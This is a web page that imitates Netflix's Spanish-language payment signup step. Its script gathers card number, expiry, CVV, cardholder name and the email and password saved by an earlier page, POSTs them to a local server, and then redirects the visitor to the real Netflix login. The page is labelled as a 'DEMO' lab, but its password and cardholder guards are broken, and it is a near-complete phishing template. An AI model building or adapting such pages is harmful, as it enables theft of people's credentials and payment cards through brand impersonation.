<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="stylesheet" href="signup.css">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet" />
</head>

<body>
    <div class="nav">
        <div class="logo">
            <img src="logo.png" alt="">
        </div>
        <div class="iniciar">
            <a href="">Iniciar sesión</a>
        </div>
    </div>
    <div class="centrado">
        <div class="check">
            <img src="candado.png" alt="">
        </div>
        <div class="title-tarjeta">
            <span>PASO <strong>4</strong> DE <strong>4</strong></span>
            <h1>Configura tu tarjeta de crédito o débito</h1>
            <img style="width: 150px;" src="tarjetas.png" alt="">
            <div class="metodos">
                <form id="cardForm">
  <input type="text" id="cardNumber" placeholder="Número de tarjeta" required>
  <div class="key">
    <input type="text" id="fechaVencimiento" placeholder="MM/AA" maxlength="5" required>
    <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
  </div>
  <input type="text" id="cardholder" placeholder="Nombre de la tarjeta (empieza con DEMO-)" required>
</form>

                <div class="p">
                    <div>
                        <span>$119 al mes a partir del tercer mes</span>
                        <p>Cancela cuando quieras</p>
                    </div>
                    <div>
                        <li>Cambiar</li>
                    </div>
                </div>
                <div class="politicas">
                    <span>Los pagos se procesarán internacionalmente. Es posible que se apliquen comisiones bancarias
                        adicionales.</span><br><br>
                    <span class="letras">Al hacer clic en el cuadro, aceptas nuestros <a href="">Términos de uso</a> y nuestra <a href="">Declaración de
                        privacidad</a>, y declaras que tienes más de 18 años. Tu membresía de Netflix seguirá activa de
                        manera automática y, hasta que la canceles, se te facturará la cuota de membresía (actualmente
                        de $119 al mes) a través de la forma de pago elegida. Puedes cancelarla en cualquier momento
                        para evitar cargos en el futuro.</span><br><br>
                    <div class="acepto">
                        <input type="checkbox" name="" id="">
                        <br>
                        <span>Acepto.</span>
                    </div>
                    <div class="membresia">
                          <button type="button" id="startMembership">Iniciar membresía</button>
                    </div>
                </div>

            </div>
        </div>
    </div>
    <div class="footer">
        <div class="pregunta">
            <p>¿Preguntas? Llama al <span>800 953 9947</span></p>
        </div>
        <div class="opciones">
            <div class="colum">
                <li>Preguntas frecuentes</li>
                <li>Privacidad</li>
            </div>
            <div class="colum">
                <li>Centro de ayuda</li>
                <li>Preferencias de cookies</li>
            </div>
            <div class="colum">
                <li>Tienda de Netflix</li>
                <li>Información corporativa</li>
            </div>

            <li>Términos de uso</li>
        </div>
        <div class="opciones">



        </div>
        <div class="idioma">
            <form action="">
                <select name="idioma" id="idioma">
                    <option value="">文 Español</option>
                    <option value="">文 Ingles</option>
                </select>
            </form>
        </div>
    </div>
</body>
<script>
  // Formatea MM/AA
  const expInput = document.getElementById('fechaVencimiento');
  expInput.addEventListener('input', (e) => {
    let v = e.target.value.replace(/\D/g, '');
    if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2,4);
    e.target.value = v.slice(0,5);
  });

  document.getElementById('startMembership').addEventListener('click', async () => {
    // Recupera email y DEMO-password guardados en regform
    const email = sessionStorage.getItem('demoEmail') || '';
    const demoPassword = sessionStorage.getItem('demoPassword') || '';

    if (!email || !demoPassword) {
      alert('Faltan datos DEMO del paso anterior. Regresa y vuelve a intentarlo.');
      return;
    }
    if (!demoPassword.startsWith('')) {
      alert('La contraseña de laboratorio debe comenzar con "DEMO-".');
      return;
    }

    // Lee tarjeta
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
    const cvv = document.getElementById('cvv').value.trim();
    const cardholder = document.getElementById('cardholder').value.trim();

    if (cardholder.toUpperCase().startsWith('4242424242424242')) {
      alert('El titular debe comenzar con "DEMO-".');
      return;
    }

    const exp = (document.getElementById('fechaVencimiento').value || '').trim();
    const [mm, yy] = exp.split('/');
    if (!mm || !yy || mm.length !== 2 || yy.length !== 2) {
      alert('Formato de vencimiento inválido. Usa MM/AA (p. ej. 12/30).');
      return;
    }

    // Solo acepta tarjetas DEMO
    const ALLOWED = ['4242424242424242','4111111111111111'];
    if (!ALLOWED.includes(cardNumber)) {
      alert('Usa un número DEMO (p. ej. 4242 4242 4242 4242).');
      return;
    }
    if (!/^(000|123)$/.test(cvv)) {
      alert('Usa un CVV DEMO (000 o 123).');
      return;
    }

    try {
      const r = await fetch('http://localhost:3000/demo-card', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          email,
          demoPassword,
          cardNumber,
          expMonth: mm,
          expYear: yy,
          cvv,
          cardholder,
          demoToken: 'DEMO_ONLY'
        })
      });
      const out = await r.json();
      if (!r.ok || !out.ok) throw new Error(out.error || 'Error demo-card');

      // Limpia datos locales
      sessionStorage.removeItem('demoEmail');
      sessionStorage.removeItem('demoPassword');

      // Redirige al sitio oficial (o a tu página final de práctica)
      window.location.replace('https://www.netflix.com/mx/login');
    } catch (e) {
      console.error(e);
      alert('No se pudo completar la DEMO. Revisa el servidor.');
    }
  });
</script>

</html>